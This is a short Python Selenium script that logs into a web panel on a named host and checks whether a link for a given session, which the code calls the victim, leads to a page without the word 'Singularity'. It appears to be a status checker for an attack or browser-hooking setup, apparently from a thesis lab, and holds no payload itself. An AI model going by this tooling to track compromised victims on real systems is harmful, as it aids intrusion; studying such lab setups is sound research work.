#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import json
import time
import itertools
import sys

options = Options()
options.add_argument("--headless")
options.headless = True

infoArray = []
for index in range(1,len(sys.argv)):
    infoArray.append(sys.argv[index]) 

server_id = infoArray[0]
session_id = infoArray[1]

# Navigate to page
driver = webdriver.Firefox(options=options, executable_path=r'python/drivers/geckodriver')
driver.get('http://soohooked.thesisdns.xyz:3129/')
#print(driver.title)

delay = 20 # seconds

try:
	input_element = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, "password")))
	#input_element = driver.find_element_by_id("password")
	input_element.send_keys(server_id)
	input_element.submit() 

	time.sleep(4)
	
	error = driver.find_elements_by_tag_name('pre')
	#error = driver.find_elements_by_tag_name('pre')

	text_list = [i.text for i in error]

	for i in range(len(text_list)):
		if text_list[i] == 'Authentication failed.':
	    		print('fail', end = '')
	    		driver.quit()
	    		sys.exit()
	    		
	items = driver.find_elements_by_tag_name('a')

	text_list = [i.text for i in items]
	items = [i.get_attribute("href") for i in items]
	victim_err = True
	for i in range(len(items)):
		if session_id in items[i]:	    		
			victim_err = False
			target_link = items[i]
	if victim_err:
		print('fail', end = '')
		driver.quit()
		sys.exit()
			
	driver.get(target_link)

	time.sleep(8)

	html = driver.page_source

	x = html.find("Singularity")

	if x == -1:
		print("success", end = '')
	else:	
		print("fail", end = '')	
	driver.quit() 
	sys.exit()

except TimeoutException:
    print ("fail", end = '')
    driver.quit()
    sys.exit()
    		
